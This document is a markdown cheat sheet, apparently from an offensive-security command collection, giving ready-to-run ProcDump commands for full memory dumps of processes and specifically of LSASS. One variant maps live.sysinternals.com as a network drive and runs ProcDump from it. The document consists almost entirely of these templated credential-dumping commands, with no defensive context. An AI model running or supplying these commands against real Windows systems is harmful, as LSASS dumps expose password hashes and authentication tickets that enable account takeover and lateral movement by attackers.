# ProcDump

## lsass

### Dump process by PID

Dump process by PID with ProcDump.

Create a full dump for a process ID.

```cmd title:"ProcDump Dump Process by PID"
procdump.exe -accepteula -ma "$pid" "$dump_file"
```
<!-- cheat
var pid
var dump_file
-->

### Dump process by name

Dump process by name with ProcDump.

Create a full dump for a named process.

```cmd title:"ProcDump Dump Process by Name"
procdump.exe -accepteula -ma "$process_name" "$dump_file"
```
<!-- cheat
var process_name
var dump_file
-->

### Local LSASS dump

Dump local LSASS dump with ProcDump.

Dump LSASS with a local ProcDump binary.

```cmd title:"ProcDump Dump Local LSASS Dump"
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```
<!-- cheat -->

### Live Sysinternals LSASS dump

Dump live sysinternals LSASS dump with ProcDump.

Map live.sysinternals.com and dump LSASS with ProcDump.

```cmd title:"ProcDump Dump Live Sysinternals LSASS Dump"
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```
<!-- cheat -->
